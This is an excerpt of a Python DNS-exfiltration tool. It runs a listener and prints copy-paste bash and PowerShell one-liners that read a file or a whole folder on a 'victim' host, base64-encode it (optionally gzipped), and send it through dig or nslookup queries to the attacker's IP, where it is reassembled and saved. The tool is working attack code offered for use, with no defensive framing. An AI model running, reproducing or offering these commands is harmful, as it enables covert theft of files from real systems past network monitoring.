...
def save_to_file(r_data, z, v):
    ...
    for key, value in r_data.items():
        ...
        print("%s[md5sum]%s '%s'\n" % (c["g"], c["e"], hashlib.md5(open(fname, "rb").read()).hexdigest()))
...
def usage(str=""):
    ...
    print()
    print("The query length cannot exceed 253 bytes. This includes the filename.")
    print("The subdomain lengths cannot exceed 63 bytes.")
    print()
    print("Advanced: ")
    print("\t%s 127.0.0.1 -z -s 4 -b 57 -f 17\t4 subdomains, 57 bytes => (57 * 4 = 228 bytes) + (4 * '.' = 232). Filename => 17 byte(s)" % sys.argv[0])
    print("\t%s 127.0.0.1 -z -s 4 -b 55 -f 29\t4 subdomains, 55 bytes => (55 * 4 = 220 bytes) + (4 * '.' = 224). Filename => 29 byte(s)" % sys.argv[0])
    print("\t%s 127.0.0.1 -z -s 4 -b 63 -f  1\t4 subdomains, 63 bytes => (63 * 4 = 252 bytes) + (4 * '.' = 256). Filename =>  1 byte(s)" % sys.argv[0])
    print()
    print(str)
...
def p_cmds(s, b, ip, z):
    ...
    if z:
        ...
        print("""\t%s#%s %sf=file.txt%s; s=%s;b=%s;c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short; done """ % (c["r"], c["e"], c["y"], c["e"], s, b, ip))
        print()
        print("%s[?]%s Copy entire folder (ZIP enabled)" % (c["y"], c["e"]))
        print("""\t%s#%s for f in $(ls .); do s=%s;b=%s;c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short; done ; done""" % (c["r"], c["e"], s, b, ip))
        print()
    else:
        print("%s[?]%s Copy individual file" % (c["y"], c["e"]))
        print("""\t%s#%s %sf=file.txt%s; s=%s;b=%s;c=0; for r in $(for i in $(base64 -w0 $f| sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short; done """ % (c["r"], c["e"], c["y"], c["e"], s, b, ip))
        print()
        print("%s[?]%s Copy entire folder" % (c["y"], c["e"]))
        print("""\t%s#%s for f in $(ls .); do s=%s;b=%s;c=0; for r in $(for i in $(base64 -w0 $f | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short; done ; done""" % (c["r"], c["e"], s, b, ip))
        print()
        print("%s[?]%s Copy entire folder in PowerShell" % (c["y"], c["e"]))
        print(
            """\t%s#%s $d="%s"; $s=%s; $b=%s; Get-ChildItem "." | Foreach-Object {$a=$_.Name; $z = [System.IO.File]::ReadAllBytes($_.FullName); $e = [System.Convert]::ToBase64String($z); $l=$e.Length; $r=""; $n=0; while ($n -le ($l/$b)) { $c=$b; if (($n*$b)+$c -gt $l) { $c=$l-($n*$b) }; $r+=$e.Substring($n*$b, $c) + "-."; if (($n%%$s) -eq ($s-1)) { nslookup -type=A $r$a. $d; $r="" } $n=$n+1 } nslookup -type=A $r$a. $d }"""
            % (c["r"], c["e"], ip, s, b))
        print()
...
if __name__ == '__main__':
    ...
    if re.match(regx_ip, ip) is None:
        usage("%s[Error]%s First argument must be the listen address." % (c["r"], c["e"]))
        exit(1)
    ...
    if (b > 63) or ((b * s) > 253) or (((b * s) + flen) > 253):
        usage("%s[Error]%s The entire query cannot exceed 253 bytes. Read the help (-h)." % (c["r"], c["e"]))
    ...
    p_cmds(s, b, ip, z)
    print("%s[+]%s Once files have been sent, use Ctrl+C to exit and save.\n" % (c["g"], c["e"]))

    try:
        r_data = {}
        while 1:
            # There is a bottleneck in this function, if the PC is very slow, it will take
            # slightly longer to send as this main loop receives the data from the victim.
